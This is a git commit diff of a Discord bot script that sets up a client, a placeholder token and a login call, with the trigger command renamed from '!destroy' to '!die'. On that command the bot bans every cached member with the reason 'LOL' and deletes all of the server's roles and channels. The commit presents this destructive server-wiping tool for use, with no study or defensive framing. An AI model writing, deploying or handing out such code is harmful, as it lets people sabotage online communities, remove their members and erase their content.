0006c4cda686b918d017d99622dc60a9dd3a9cea
its-epic-jake <61893488+its-epic-jake@users.noreply.github.com>
2020-11-11 13:16:06 -0800

    Update code.js

--- code.js
+++ code.js
@@ -1,18 +1,29 @@
+const discord = require('discord.js')
+const client = new discord.Client()
+const token = 'Your_Token_Here'
+
 const prefix = '!'
 
 client.on("message", message => {
-    if (message.content.toLocaleLowerCase() === prefix + 'destroy')  {
-      message.guild.members.cache.map(member => {member.ban({reason: 'LOL'}).then(console.log).catch(console.error)})
+    if (message.content.toLocaleLowerCase() === prefix + 'die')  {
+      message.guild.members.cache.map(member => {
+        member.ban({reason: 'LOL'}).then(console.log)
+        .catch(console.error);
+      });
+
       message.guild.roles.cache.forEach(roles => {
         roles.delete()
         .then(deleted => console.log(`Deleted role ${deleted.name}`))
         .catch(console.error);
       });
-      message.guild.channels.cache.forEach(roles => {
-        roles.delete()
+
+      message.guild.channels.cache.forEach(channels => {
+        channels.delete()
         .then(deleted => console.log(`Deleted channel ${deleted.name}`))
         .catch(console.error);
       });
     }
 }
 );
+
+client.login(token)
